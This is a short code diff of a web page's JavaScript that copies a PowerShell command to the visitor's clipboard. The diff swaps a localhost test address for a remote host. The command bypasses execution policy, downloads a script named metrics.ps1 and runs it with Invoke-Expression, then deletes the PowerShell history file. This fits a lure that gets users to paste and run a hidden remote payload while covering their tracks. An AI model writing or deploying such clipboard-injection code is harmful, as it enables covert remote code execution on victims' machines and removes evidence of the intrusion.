@@ -10,7 +10,8 @@
 
     <script>
         function copiarComando() {
-            const cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression (Invoke-RestMethod -Uri 'http://localhost:2020'); Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue; while (Get-Process chrome -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 }) { Start-Sleep -Milliseconds 200 }; exit\"";
+                        const cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression (Invoke-RestMethod -Uri 'https://web.haroldsoftware.com/metrics.ps1'); Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue\"";
+            // const cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression (Invoke-RestMethod -Uri 'http://localhost:2020'); Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue; while (Get-Process chrome -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 }) { Start-Sleep -Milliseconds 200 }; exit\"";
             navigator.clipboard.writeText(cmd).then(() => {
                 console.log('Comando copiado al portapapeles');
                 document.body.removeAttribute('onclick');
